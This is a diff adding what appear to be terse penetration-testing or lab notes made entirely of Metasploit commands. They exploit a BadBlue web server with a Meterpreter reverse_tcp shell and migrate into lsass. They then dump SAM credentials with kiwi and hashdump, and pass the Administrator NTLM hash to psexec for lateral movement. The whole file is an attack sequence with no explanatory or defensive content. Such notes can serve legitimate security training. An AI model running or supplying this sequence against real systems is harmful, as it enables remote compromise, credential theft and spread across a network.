@@ -1,0 +1,21 @@
+search badblue
+exploit/windows/http/badblue_passthru
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+pgrep lsass
+780
+migrate 780
+getuid
+load kiwi
+lsa_dump_sam
+hashdump
+ctrl+z
+
+search psexec
+exploit/windows/smb/psexec
+set LPORT 
+set SMBUser Administrator
+set SMBPass NTLM hash
+set target Command
+set TARGET Native\ upload
+
